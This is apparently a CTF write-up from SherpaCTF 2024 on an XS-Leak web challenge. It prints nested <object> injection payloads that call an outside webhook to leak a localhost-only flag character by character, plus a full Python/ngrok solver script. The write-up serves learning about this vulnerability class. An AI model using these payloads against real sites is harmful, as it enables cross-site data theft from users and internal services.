So yea, I followed the hints given and I suddenly remembered another legend, Zeyu that had given multiple speech and trainings regarding web attacks. So I look into [XS Leak by Zeyu](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks) and I found a few resources that can help me understand the vulnerability more.

*Note: Read the blog, its freaking interesting and useful, if you want a video version, here:* [https://www.youtube.com/watch?v=SEVdfk0vTCM](https://www.youtube.com/watch?v=SEVdfk0vTCM)

So based on the explanations I kinda got everything I need. To explain abit, its basically injecting the tags and attribute not to achieve JavaScript injections, but to leak out data from forbidden pages, like in this case, using the form field to leak out the flag in /oshaoshaflagfinder.

BUT YOU KNOW WHAT, DO YOU KNOW WHAT? “you are veeeerrryyyy closeeee” HAPPENED. FOR. FOUR. HOURS.

Check this out:

```js
<object data="/oshaoshaflagfinder?flag=SHCTF24{">
    <object data="https://webhook.site/10661646-e8b2-4cdc-bc25-1c107809488e?flag=SHCTF24{"></object>
</object>
```

So what this exploit does, is that when injected, the object will hold the data in /oshaoshaflagfinder. But since its 403, the nested-object will be held instead, meaning that a webhook session will be started.

![/comment endpoint](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%207.png?raw=true)

*note: see the huge empty comment field? Thats where your <object> is injected*

In the process of this challenge, after injecting the script, you report the page by sending the whole URL to the reporting page at “/osha-see” endpoint. 

And when you do that, the bot will visit the affected endpoint, which triggers the first object as it holds the administrator cookie. 

But how do you get the flag? Understand this:

```js
<object data="/oshaoshaflagfinder?flag=SHCTF24{">
```

The parameter and value: `?flag=xxxxx` plays important role in this.

As the bot is allowed to visit the page, when triggered with the correct part of the flag through the 

`?flag` parameter, then the nested object will not be triggered. So just a `response 200` happening.

but if its the wrong value like `?flag=xxxxx` , then the nested line:

```js
    <object data="https://webhook.site/your_webhook_here?flag=SHCTF24{"></object>
</object>
```

will be triggered due to a `response 404`, starting a webhook connection.

![webhook](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%208.png?raw=true)

It’s basically like a whole error-based character leak happening here.

YES I GET THE LOGIC, BUT YOU KNOW WHAT, I FORGOT ABOUT THE “ONLY LOCALHOST” PART OF THE CHALLENGE……

so yea, you need to add the [`localhost`](http://localhost) and `environment port` (not the remote port) on the payload together….

Why? Remember the “I thought its bypass 403” part?

```js
// Flag finder
app.get('/oshaoshaflagfinder', (req, res) => {
    const remoteIP = req.socket.remoteAddress;

    if (remoteIP === '::ffff:127.0.0.1' || remoteIP === '::1' || remoteIP === '127.0.0.1') {
        const { flag } = req.query;
        const expectedFlag = 'SHCTF24{FAKE_FLAG!}';
        if (!flag) {
            return res.status(404).send('No');
        }

        let isValid = true;
        for (let i = 0; i < flag.length; i++) {
            if (flag[i] !== expectedFlag[i] || !fs.existsSync(path.join(imagePath, `${flag[i]}.png`))) {
                isValid = false;
                break;
            }
        }

        res.status(isValid ? 200 : 404).send(isValid ? 'Yes' : 'No');

    } else {
        return res.status(403).send(`You are not allowed to access this resource...`);
    }
```

That means that u still need to bypass 403 but through the injection point, not the security header.

As for the why use environment port not remote port, the `getSanitizeOptions()` function is within the `sanitizeMdleware.js` file, in which if you check the `app.js` file, there’s actually a part where it  mentions that the middleware runs on port 5577.

```js
// ---------- MIDDLEWARES ----------
const app = express();
const PORT = process.env.PORT || 5577;
const imagePath = './images';

const csp = "connect-src 'self'; form-action 'self';";

app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', csp);
    res.setHeader('X-Content-Type-Options', 'nosniff');
    next();
});
```

So instead of allowing the code to automatically run through the remote address and port, you need to specify the `local IP` and `environment port`.

Final payload:

```js
<object data="http://127.0.0.1:5577/oshaoshaflagfinder?flag=SHCTF24{">
    <object data="https://webhook.site/your_webhook_here?flag=SHCTF24{"></object>
</object>
```

So yea….there’s another 4 hours….

Back to the challenge, how do you know the characters of the flag? 

![Challenge description](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%209.png?raw=true)

This part of the challenge description is important.

So you visit the folder, and you can see the `name.png` is all part of the characters possible for the flag.

![Image folder](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%2010.png?raw=true)

So, brute for `!_{}24ABCDEFGHIJKLMNOPQRSTUVWXYZ`

1. Inject the payload at index.

![Inject payload](image%2011.png)

2. It will redirect you to the comment endpoint. After triggering the payload like this:

![Go to the endpoint](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%207.png?raw=true)

3. You take the affected URL from above and go report it in `/osha-see`

![Report the comment endpoint through /osha-see](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%2012.png?raw=true)

4. Check webhook for connection, if `got connection = wrong character`, `no connection = correct character`.

![Check webhook](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/image%2013.png?raw=true)

5. REPEAT THE PROCESS UNTIL YOU GET THE FLAG.

Ok so my scripting skills is not good, I do this manually. But after the CTF, our buddy, mr.vicevirus had given the `script to solve` the challenge.

*Note: solution script requires your setup of ngrok and is written in flask.*

```python
# This solver script is used to solve the "Oshawott As A Service" challenge, using object tag leak to find the flag character by character.
# 1. If your webhook site is called, then that is not the correct flag character.
# 2. If your webhook site is not called, then that is the correct character!
# 3. Repeat the process for the next character until you find the full flag.
from flask import Flask, request
from pyngrok import ngrok
import threading
import requests
import string
import uuid

# Flask app setup
app = Flask(__name__)
callbacks = {}

@app.route('/webhook', methods=['GET'])
def webhook():
    unique_id = request.args.get('id')
    callback = request.args.get('callback')
    if unique_id and callback:
        callbacks[unique_id] = callback
        print(f"Received callback for ID: {unique_id}, callback: {callback}")
    return '', 204

def start_flask_app():
    app.run(port=5000)

# Start Flask app in a new thread
threading.Thread(target=start_flask_app).start()

# Start Ngrok tunnel to the Flask app
ngrok_tunnel = ngrok.connect(5000, "tcp")
public_url = ngrok_tunnel.public_url.replace('tcp://', '')
tcp_address, tcp_port = public_url.split(':')
print(f"Ngrok TCP tunnel established at {public_url}")

# CTF challenge
CTF_HOST = 'http://52.148.100.67:30679'
CHALL_PORT = 5577
HEADERS = {
    'Content-Type': 'application/json',
    'Origin': CTF_HOST,
    'Referer': CTF_HOST + '/',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Connection': 'close',
}

def submit_comment_and_invoke_bot(char, partial_flag):
    unique_id = str(uuid.uuid4())
    # Using the Ngrok TCP address and port for the callback URL
    callback_url = f"http://{tcp_address}:{tcp_port}/webhook?id={unique_id}&callback={char}"
    payload = {
        "comment": f'<object data="http://127.0.0.1:{CHALL_PORT}/oshaoshaflagfinder?flag={partial_flag}{char}"><object data="{callback_url}"></object></object>',
        "image": "/images/D.png"
    }
    print(payload)
    response = requests.post(f'{CTF_HOST}/comment', json=payload, headers=HEADERS)

    if response.status_code == 200 and 'hash' in response.json():
        url_to_visit = f"{CTF_HOST}/comment?hash={response.json().get('hash')}"
        print(url_to_visit)
        bot_response = requests.post(f'{CTF_HOST}/osha-see', json={"url": url_to_visit}, headers=HEADERS)
        if bot_response.status_code == 200:
            return unique_id
    return None

def check_callback_received(unique_id):
    # Check if a callback for the unique_id was received
    return unique_id not in callbacks

def main():
    partial_flag = "SH"
    characters = string.ascii_uppercase + "_}!"

    while not partial_flag.endswith("}"):
        for char in characters:
            print(f"Testing '{char}' for partial flag: {partial_flag}")
            unique_id = submit_comment_and_invoke_bot(char, partial_flag)
            if unique_id and check_callback_received(unique_id):
                partial_flag += char
                print(f"Updated partial flag: {partial_flag}")
                break

    print(f"Final flag found: {partial_flag}")

if __name__ == "__main__":
    main()
```

`Flag: SHCTF24{LEEK!}`

What I learned: A new vulnerability, XS Leak, understanding what is object leak and how it works. Also beat a new record for hours per challenge...(18 now).

![Some pic of them bois](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/SherpaCTF/sherpa_bois?raw=true)

# Conclusion
SherpaCTF 2024 was really fun. Staying up all night with my bros, chill with other participants, meet and greet with all the legends. I met new people, compete with them, die trying to get the first blood for web, and also proudly presented the challenge solved in front of everyone. This is one of the greater experience I get as a CTF player in Malaysia. 